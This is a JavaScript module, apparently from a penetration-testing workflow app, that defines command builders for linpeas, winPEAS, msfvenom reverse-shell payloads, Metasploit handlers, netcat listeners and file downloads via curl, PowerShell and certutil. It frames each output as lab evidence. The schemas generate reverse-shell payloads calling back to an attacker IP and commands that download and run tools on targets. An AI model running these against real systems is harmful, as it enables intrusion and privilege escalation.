'use strict';
(function(root){
const schema=root.OBOL_TOOL_BUILDER_SCHEMA;
if(!schema)throw new Error('Tool Builder schema is required before helper builders');

function common(summary){return {
 evidence:{expectation:summary.expectation,proofBoundary:summary.proofBoundary},
 manualOutcome:{supported:true,boundary:summary.manualBoundary},
 reportLineage:{activity:true,evidenceRequiredForProof:true,secretFields:summary.secretFields||[]}
};}
function opt(values){return values.map(v=>({value:v,label:v}));}
function reg(builder){return schema.register(builder);}

const linpeas=reg(Object.assign({
 id:'tb-linpeas',tool:'linpeas',title:'linpeas launcher',summary:'Build a Linux privilege-enumeration helper command for download, serve, run, and cleanup modes. Enumeration output must return through Evidence before any privesc lead becomes proof.',executionContext:'linux',credentialModes:[],
 fields:[
  {id:'mode',label:'Mode',type:'select',default:'run-local',options:[{value:'serve',label:'Serve linpeas from Kali'},{value:'download',label:'Download linpeas on target'},{value:'run-local',label:'Run local linpeas script'},{value:'cleanup',label:'Cleanup staged linpeas file'}]},
  {id:'listenHost',label:'Server bind host',type:'text',default:'0.0.0.0',visibleWhen:{field:'mode',equals:'serve'}},
  {id:'listenPort',label:'Server port',type:'number',default:'8000',visibleWhen:{field:'mode',equals:'serve'}},
  {id:'serveDir',label:'Directory containing linpeas.sh',type:'path',default:'.',visibleWhen:{field:'mode',equals:'serve'}},
  {id:'url',label:'linpeas download URL',type:'text',placeholder:'http://10.10.14.9:8000/linpeas.sh',requiredWhen:{field:'mode',equals:'download'},visibleWhen:{field:'mode',equals:'download'}},
  {id:'targetPath',label:'Target path',type:'path',default:'/tmp/linpeas.sh',visibleWhen:{field:'mode',in:['download','run-local','cleanup']}},
  {id:'outputFile',label:'Output file',type:'path',placeholder:'/tmp/linpeas.out',visibleWhen:{field:'mode',equals:'run-local'}},
  {id:'colorless',label:'Disable colors for cleaner Evidence',type:'checkbox',visibleWhen:{field:'mode',equals:'run-local'}}
 ],
 command:{executable:{field:'mode',choices:[{value:'serve',command:'python3'},{value:'download',command:'curl'},{value:'run-local',command:'bash'},{value:'cleanup',command:'rm'}]},tokens:[
  {kind:'literal',value:'-m',when:{field:'mode',equals:'serve'}},{kind:'literal',value:'http.server',when:{field:'mode',equals:'serve'}},{kind:'field',field:'listenPort',when:{field:'mode',equals:'serve'}},{kind:'field',field:'listenHost',flag:'--bind',when:{field:'mode',equals:'serve'}},{kind:'field',field:'serveDir',flag:'--directory',when:{field:'mode',equals:'serve'}},
  {kind:'literal',value:'-fsSL',when:{field:'mode',equals:'download'}},{kind:'field',field:'url',when:{field:'mode',equals:'download'}},{kind:'field',field:'targetPath',flag:'-o',when:{field:'mode',equals:'download'}},
  {kind:'field',field:'targetPath',when:{field:'mode',equals:'run-local'}},{kind:'choice',field:'colorless',choices:[{value:true,arg:'-q'},{value:false,arg:''}],when:{field:'mode',equals:'run-local'}},{kind:'field',field:'outputFile',prefix:'| tee ',raw:true,when:{field:'mode',equals:'run-local'}},
  {kind:'literal',value:'-f',when:{field:'mode',equals:'cleanup'}},{kind:'field',field:'targetPath',when:{field:'mode',equals:'cleanup'}}
 ]}
},common({expectation:'Paste linpeas download, execution, interesting findings, failure, or cleanup output into Evidence. Evidence may record helper activity, enum lead classes, transfer state, or cleanup state.',proofBoundary:'linpeas execution is enumeration, not privilege escalation. Interesting findings are leads until independent commands prove writable execution, credential reuse, sudo rights, SUID/capability abuse, or root context.',manualBoundary:'Manual success can mark the helper run as tried or completed, but it does not prove root, exploitability, or credential validity.'})));

const winpeas=reg(Object.assign({
 id:'tb-winpeas',tool:'winpeas',title:'winPEAS launcher',summary:'Build a Windows privilege-enumeration helper command for serving, PowerShell/certutil download, execution, and cleanup modes.',executionContext:'windows',credentialModes:[],
 fields:[
  {id:'mode',label:'Mode',type:'select',default:'run-local',options:[{value:'serve',label:'Serve winPEAS from Kali'},{value:'ps-download',label:'Download with PowerShell'},{value:'certutil-download',label:'Download with certutil'},{value:'run-local',label:'Run winPEAS on target'},{value:'cleanup',label:'Cleanup staged winPEAS file'}]},
  {id:'listenPort',label:'Server port',type:'number',default:'8000',visibleWhen:{field:'mode',equals:'serve'}},
  {id:'serveDir',label:'Directory containing winPEAS',type:'path',default:'.',visibleWhen:{field:'mode',equals:'serve'}},
  {id:'url',label:'winPEAS download URL',type:'text',placeholder:'http://10.10.14.9:8000/winPEASx64.exe',requiredWhen:{field:'mode',in:['ps-download','certutil-download']},visibleWhen:{field:'mode',in:['ps-download','certutil-download']}},
  {id:'targetPath',label:'Target path',type:'path',default:'C:\\Windows\\Temp\\winPEASx64.exe',visibleWhen:{field:'mode',in:['ps-download','certutil-download','run-local','cleanup']}},
  {id:'quiet',label:'Quiet output mode',type:'checkbox',visibleWhen:{field:'mode',equals:'run-local'}},
  {id:'outputFile',label:'Output file',type:'path',placeholder:'C:\\Windows\\Temp\\winpeas.txt',visibleWhen:{field:'mode',equals:'run-local'}}
 ],
 command:{executable:{field:'mode',choices:[{value:'serve',command:'python3'},{value:'ps-download',command:'powershell'},{value:'certutil-download',command:'certutil'},{value:'run-local',command:'cmd'},{value:'cleanup',command:'cmd'}]},tokens:[
  {kind:'literal',value:'-m',when:{field:'mode',equals:'serve'}},{kind:'literal',value:'http.server',when:{field:'mode',equals:'serve'}},{kind:'field',field:'listenPort',when:{field:'mode',equals:'serve'}},{kind:'field',field:'serveDir',flag:'--directory',when:{field:'mode',equals:'serve'}},
  {kind:'literal',value:'-NoP -ExecutionPolicy Bypass -Command',when:{field:'mode',equals:'ps-download'}},{kind:'concat',raw:false,when:{field:'mode',equals:'ps-download'},parts:[{literal:'Invoke-WebRequest -Uri '},{field:'url'},{literal:' -OutFile '},{field:'targetPath'}]},
  {kind:'literal',value:'-urlcache -f',when:{field:'mode',equals:'certutil-download'}},{kind:'field',field:'url',when:{field:'mode',equals:'certutil-download'}},{kind:'field',field:'targetPath',when:{field:'mode',equals:'certutil-download'}},
  {kind:'literal',value:'/c',when:{field:'mode',in:['run-local','cleanup']}},{kind:'concat',raw:false,when:{field:'mode',equals:'run-local'},parts:[{field:'targetPath'},{literal:' '},{field:'quiet',prefix:'quiet='},{literal:' > '},{field:'outputFile'}]},
  {kind:'concat',raw:false,when:{field:'mode',equals:'cleanup'},parts:[{literal:'del /f /q '},{field:'targetPath'}]}
 ]}
},common({expectation:'Paste winPEAS download, execution, finding, failure, or cleanup output into Evidence. Evidence may record helper activity, Windows enum lead classes, transfer state, or cleanup state.',proofBoundary:'winPEAS output is lead generation. A service path, AlwaysInstallElevated key, token clue, credential file, or local exploit hint is not proof until a separate check confirms exploitability and resulting context.',manualBoundary:'Manual success records workflow state only. Administrator or SYSTEM proof requires reviewed command output such as whoami /all, hostname, privilege/token context, or equivalent.'})));

const msfvenom=reg(Object.assign({
 id:'tb-msfvenom',tool:'msfvenom',title:'msfvenom payload builder',summary:'Build a minimal payload generation command with explicit payload, LHOST/LPORT, format, architecture, encoder, output, and handler handoff fields.',executionContext:'kali',credentialModes:[],
 fields:[
  {id:'payload',label:'Payload',type:'select',default:'windows/x64/meterpreter/reverse_tcp',options:opt(['windows/x64/meterpreter/reverse_tcp','windows/meterpreter/reverse_tcp','windows/x64/shell_reverse_tcp','linux/x64/shell_reverse_tcp','php/reverse_php','cmd/unix/reverse_bash'])},
  {id:'lhost',label:'LHOST',type:'text',required:true,placeholder:'10.10.14.9'},
  {id:'lport',label:'LPORT',type:'number',required:true,default:'4444'},
  {id:'format',label:'Format',type:'select',default:'exe',options:opt(['exe','elf','raw','asp','aspx','war','php','psh','python'])},
  {id:'arch',label:'Architecture',type:'select',default:'auto',options:[{value:'auto',label:'Payload default'},{value:'x86',label:'x86'},{value:'x64',label:'x64'}]},
  {id:'platform',label:'Platform',type:'select',default:'auto',options:[{value:'auto',label:'Payload default'},{value:'windows',label:'windows'},{value:'linux',label:'linux'},{value:'php',label:'php'}]},
  {id:'encoder',label:'Encoder',type:'text',placeholder:'x86/shikata_ga_nai'},
  {id:'badchars',label:'Bad characters',type:'text',placeholder:'\\x00\\x0a\\x0d'},
  {id:'output',label:'Output file',type:'path',required:true,default:'payload.exe'},
  {id:'listPayloads',label:'List payloads instead of generating',type:'checkbox'}
 ],
 command:{executable:'msfvenom',tokens:[
  {kind:'literal',value:'-l payloads',when:{field:'listPayloads',truthy:true}},
  {kind:'field',field:'payload',flag:'-p',when:{field:'listPayloads',truthy:false}},{kind:'field',field:'lhost',prefix:'LHOST=',raw:false,when:{field:'listPayloads',truthy:false}},{kind:'field',field:'lport',prefix:'LPORT=',raw:false,when:{field:'listPayloads',truthy:false}},{kind:'field',field:'format',flag:'-f',when:{field:'listPayloads',truthy:false}},{kind:'choice',field:'arch',choices:[{value:'auto',arg:''},{value:'x86',arg:'-a x86'},{value:'x64',arg:'-a x64'}],when:{field:'listPayloads',truthy:false}},{kind:'choice',field:'platform',choices:[{value:'auto',arg:''},{value:'windows',arg:'--platform windows'},{value:'linux',arg:'--platform linux'},{value:'php',arg:'--platform php'}],when:{field:'listPayloads',truthy:false}},{kind:'field',field:'encoder',flag:'-e',when:{field:'listPayloads',truthy:false}},{kind:'field',field:'badchars',flag:'-b',when:{field:'listPayloads',truthy:false}},{kind:'field',field:'output',flag:'-o',when:{field:'listPayloads',truthy:false}}
 ]}
},common({expectation:'Paste msfvenom generation output, payload metadata, handler mismatch warnings, or file creation evidence into Evidence.',proofBoundary:'Generating a payload proves only artifact creation intent. It does not prove delivery, execution, callback, privilege, or persistence. Those require separate transfer, listener/session, and context Evidence.',manualBoundary:'Manual success means the payload artifact was generated or staged, not that it executed.'})));

const msfconsole=reg(Object.assign({
 id:'tb-msfconsole',tool:'msfconsole',title:'msfconsole handler and resource-script builder',summary:'Build a reviewable msfconsole handler or resource-script command without executing anything inside Obol.',executionContext:'kali',credentialModes:[],
 fields:[
  {id:'mode',label:'Mode',type:'select',default:'handler',options:[{value:'handler',label:'One-line handler setup'},{value:'resource',label:'Run resource script file'},{value:'write-resource',label:'Generate resource script text'}]},
  {id:'payload',label:'Payload',type:'text',default:'windows/x64/meterpreter/reverse_tcp',visibleWhen:{field:'mode',in:['handler','write-resource']}},
  {id:'lhost',label:'LHOST',type:'text',requiredWhen:{field:'mode',in:['handler','write-resource']},visibleWhen:{field:'mode',in:['handler','write-resource']}},
  {id:'lport',label:'LPORT',type:'number',default:'4444',requiredWhen:{field:'mode',in:['handler','write-resource']},visibleWhen:{field:'mode',in:['handler','write-resource']}},
  {id:'exitOnSession',label:'ExitOnSession',type:'select',default:'false',options:opt(['false','true']),visibleWhen:{field:'mode',in:['handler','write-resource']}},
  {id:'resourceFile',label:'Resource file',type:'path',default:'listener.rc',visibleWhen:{field:'mode',in:['resource','write-resource']}},
  {id:'background',label:'Start job in background (-j)',type:'checkbox',visibleWhen:{field:'mode',equals:'handler'}}
 ],
 command:{executable:'msfconsole',tokens:[
  {kind:'literal',value:'-q',when:{field:'mode',equals:'handler'}},{kind:'literal',value:'-x',when:{field:'mode',equals:'handler'}},{kind:'concat',raw:false,when:{field:'mode',equals:'handler'},parts:[{literal:'use exploit/multi/handler; set PAYLOAD '},{field:'payload'},{literal:'; set LHOST '},{field:'lhost'},{literal:'; set LPORT '},{field:'lport'},{literal:'; set ExitOnSession '},{field:'exitOnSession'},{literal:'; run '},{field:'background',prefix:'-j'}]},
  {kind:'literal',value:'-q -r',when:{field:'mode',equals:'resource'}},{kind:'field',field:'resourceFile',when:{field:'mode',equals:'resource'}},
  {kind:'literal',value:'-q -x',when:{field:'mode',equals:'write-resource'}},{kind:'concat',raw:false,when:{field:'mode',equals:'write-resource'},parts:[{literal:'spool '},{field:'resourceFile'},{literal:'; echo use exploit/multi/handler; echo set PAYLOAD '},{field:'payload'},{literal:'; echo set LHOST '},{field:'lhost'},{literal:'; echo set LPORT '},{field:'lport'},{literal:'; echo set ExitOnSession '},{field:'exitOnSession'},{literal:'; spool off; exit'}]}
 ]}
},common({expectation:'Paste handler startup, bind failure, session-open/lost, resource-script review, job list, route/session, or cleanup output into Evidence.',proofBoundary:'A handler listening or resource script loading does not prove callback, access, execution, route creation, privilege, or cleanup. Session and context facts require explicit session output.',manualBoundary:'Manual success records handler setup only unless reviewed Evidence proves a callback/session.'})));

const listener=reg(Object.assign({
 id:'tb-nc-penelope',tool:'nc-penelope',title:'nc / Penelope listener helper',summary:'Build copy-only listener and shell-upgrade helpers for nc and Penelope with explicit host, port, shell type, and cleanup expectations.',executionContext:'kali',credentialModes:[],
 fields:[
  {id:'toolChoice',label:'Tool',type:'select',default:'nc',options:[{value:'nc',label:'nc / ncat listener'},{value:'penelope',label:'Penelope listener'}]},
  {id:'lhost',label:'LHOST / bind host',type:'text',placeholder:'0.0.0.0'},
  {id:'lport',label:'LPORT',type:'number',required:true,default:'4444'},
  {id:'shellType',label:'Expected shell',type:'select',default:'unknown',options:opt(['unknown','linux-sh','linux-bash','windows-cmd','windows-powershell'])},
  {id:'verbose',label:'Verbose listener',type:'checkbox'},
  {id:'rlwrap',label:'Wrap nc with rlwrap',type:'checkbox',visibleWhen:{field:'toolChoice',equals:'nc'}},
  {id:'scriptPath',label:'Penelope path',type:'path',default:'penelope.py',visibleWhen:{field:'toolChoice',equals:'penelope'}}
 ],
 command:{executable:{field:'toolChoice',choices:[{value:'nc',command:'nc'},{value:'penelope',command:'python3'}]},tokens:[
  {kind:'field',field:'scriptPath',when:{field:'toolChoice',equals:'penelope'}},{kind:'field',field:'lport',flag:'-p',when:{field:'toolChoice',equals:'penelope'}},{kind:'toggle',field:'verbose',flag:'-v',when:{field:'toolChoice',equals:'penelope'}},
  {kind:'toggle',field:'verbose',flag:'-v',when:{field:'toolChoice',equals:'nc'}},{kind:'literal',value:'-lvnp',when:{field:'toolChoice',equals:'nc'}},{kind:'field',field:'lport',when:{field:'toolChoice',equals:'nc'}}
 ]}
},common({expectation:'Paste listener startup, bind failure, connection received, shell-upgrade, lost session, or cleanup output into Evidence.',proofBoundary:'A bound listener proves only that the local port is waiting. Access begins only when reviewed callback output proves an interactive session and target context.',manualBoundary:'Manual success records listener readiness only. Foothold and privilege require session output such as whoami, hostname, id, or equivalent.'})));

const transfer=reg(Object.assign({
 id:'tb-file-transfer-helper',tool:'file-transfer',title:'file transfer helper',summary:'Build common lab transfer helpers for HTTP serving, Linux fetches, Windows PowerShell/certutil fetches, and Impacket SMB serving.',executionContext:'any',credentialModes:['password'],
 fields:[
  {id:'method',label:'Method',type:'select',default:'python-http-server',options:[{value:'python-http-server',label:'Python HTTP server'},{value:'wget',label:'wget fetch'},{value:'curl',label:'curl fetch'},{value:'powershell-iwr',label:'PowerShell Invoke-WebRequest'},{value:'certutil',label:'certutil fetch'},{value:'impacket-smbserver',label:'Impacket SMB server'}]},
  {id:'listenPort',label:'Listen port',type:'number',default:'8000',visibleWhen:{field:'method',equals:'python-http-server'}},
  {id:'serveDir',label:'Serve directory',type:'path',default:'.',visibleWhen:{field:'method',in:['python-http-server','impacket-smbserver']}},
  {id:'shareName',label:'SMB share name',type:'text',default:'share',visibleWhen:{field:'method',equals:'impacket-smbserver'}},
  {id:'url',label:'Source URL',type:'text',placeholder:'http://10.10.14.9:8000/file',requiredWhen:{field:'method',in:['wget','curl','powershell-iwr','certutil']},visibleWhen:{field:'method',in:['wget','curl','powershell-iwr','certutil']}},
  {id:'output',label:'Destination path',type:'path',placeholder:'/tmp/file or C:\\Windows\\Temp\\file.exe',requiredWhen:{field:'method',in:['wget','curl','powershell-iwr','certutil']},visibleWhen:{field:'method',in:['wget','curl','powershell-iwr','certutil']}},
  {id:'smb2',label:'Enable SMB2 support',type:'checkbox',visibleWhen:{field:'method',equals:'impacket-smbserver'}},
  {id:'verify',label:'Add integrity/hash verification reminder',type:'checkbox'}
 ],
 command:{executable:{field:'method',choices:[{value:'python-http-server',command:'python3'},{value:'wget',command:'wget'},{value:'curl',command:'curl'},{value:'powershell-iwr',command:'powershell'},{value:'certutil',command:'certutil'},{value:'impacket-smbserver',command:'impacket-smbserver'}]},tokens:[
  {kind:'literal',value:'-m http.server',when:{field:'method',equals:'python-http-server'}},{kind:'field',field:'listenPort',when:{field:'method',equals:'python-http-server'}},{kind:'field',field:'serveDir',flag:'--directory',when:{field:'method',equals:'python-http-server'}},
  {kind:'field',field:'url',when:{field:'method',equals:'wget'}},{kind:'field',field:'output',flag:'-O',when:{field:'method',equals:'wget'}},
  {kind:'literal',value:'-fsSL',when:{field:'method',equals:'curl'}},{kind:'field',field:'url',when:{field:'method',equals:'curl'}},{kind:'field',field:'output',flag:'-o',when:{field:'method',equals:'curl'}},
  {kind:'literal',value:'-NoP -ExecutionPolicy Bypass -Command',when:{field:'method',equals:'powershell-iwr'}},{kind:'concat',raw:false,when:{field:'method',equals:'powershell-iwr'},parts:[{literal:'Invoke-WebRequest -Uri '},{field:'url'},{literal:' -OutFile '},{field:'output'}]},
  {kind:'literal',value:'-urlcache -f',when:{field:'method',equals:'certutil'}},{kind:'field',field:'url',when:{field:'method',equals:'certutil'}},{kind:'field',field:'output',when:{field:'method',equals:'certutil'}},
  {kind:'field',field:'shareName',when:{field:'method',equals:'impacket-smbserver'}},{kind:'field',field:'serveDir',when:{field:'method',equals:'impacket-smbserver'}},{kind:'toggle',field:'smb2',flag:'-smb2support',when:{field:'method',equals:'impacket-smbserver'}}
 ]}
},common({expectation:'Paste server startup, HTTP request, SMB connection, download completion, hash/size verification, denied transfer, or cleanup output into Evidence.',proofBoundary:'Serving a file or running a transfer command does not prove target execution. It proves transfer state only when reviewed output shows the request, file creation, size/hash, or explicit failure.',manualBoundary:'Manual success records transfer workflow state only. Execution and privilege require separate reviewed Evidence.'})));

function patchInventory(){
 const inv=root.OBOL_TOOL_BUILDER_INVENTORY;if(!inv||!inv.dispositions)return false;
 const updates={
  linpeas:['implemented','tb-linpeas','linpeas is implemented as the Linux privilege-enumeration helper builder with serve, download, run, cleanup, and Evidence-ingestion boundaries.'],
  winpeas:['implemented','tb-winpeas','winPEAS is implemented as the Windows privilege-enumeration helper builder with serve, download, run, cleanup, and Evidence-ingestion boundaries.'],
  msfvenom:['implemented','tb-msfvenom','msfvenom is implemented as the payload-generation builder with explicit payload, callback, format, architecture, encoder, badchar, output, and handler-handoff fields.'],
  msfconsole:['implemented','tb-msfconsole','msfconsole is implemented for handler and resource-script setup while callback/session facts remain Evidence-gated.'],
  metasploit:['implemented','tb-msfconsole','Metasploit handler/resource-script setup is represented by the msfconsole builder; exploit/post modules remain governed by their path cards and Evidence boundaries.'],
  nc:['implemented','tb-nc-penelope','nc listener behavior is implemented through the nc/Penelope helper builder with listener/session Evidence boundaries.'],
  ncat:['implemented','tb-nc-penelope','ncat listener behavior is represented by the nc/Penelope helper builder.'],
  penelope:['implemented','tb-nc-penelope','Penelope listener behavior is implemented through the nc/Penelope helper builder with session-upgrade Evidence boundaries.'],
  wget:['implemented','tb-file-transfer-helper','wget transfer is implemented through the common file-transfer helper builder.'],
  certutil:['implemented','tb-file-transfer-helper','certutil transfer is implemented through the common file-transfer helper builder.'],
  'impacket-smbserver':['implemented','tb-file-transfer-helper','Impacket SMB server is implemented through the common file-transfer helper builder.']
 };
 const dispositions=Object.assign({},inv.dispositions);
 for(const [tool,[status,queueItem,rationale]] of Object.entries(updates))dispositions[tool]=Object.freeze({tool,status,queueItem,rationale});
 const api=Object.assign({},inv,{schemaVersion:'1.1.0',dispositions:Object.freeze(dispositions),get:function(tool){return dispositions[inv.key(tool)]||null;},all:function(){return Object.values(dispositions);},validate:function(){const failures=[];const allowed=root.OBOL_TOOL_BUILDER_SCHEMA&&root.OBOL_TOOL_BUILDER_SCHEMA.dispositionStatuses||['implemented','modeled','superseded','rejected'];for(const record of Object.values(dispositions)){if(!allowed.includes(record.status))failures.push('unsupported disposition status for '+record.tool+': '+record.status);if(!record.rationale)failures.push('missing disposition rationale for '+record.tool);}return failures;}});
 root.OBOL_TOOL_BUILDER_INVENTORY=Object.freeze(api);
 return true;
}
const patchedInventory=patchInventory();
root.OBOL_HELPER_TOOL_BUILDERS=Object.freeze({version:'1.0.0',builders:Object.freeze([linpeas,winpeas,msfvenom,msfconsole,listener,transfer]),patchedInventory});
})(typeof window!=='undefined'?window:globalThis);
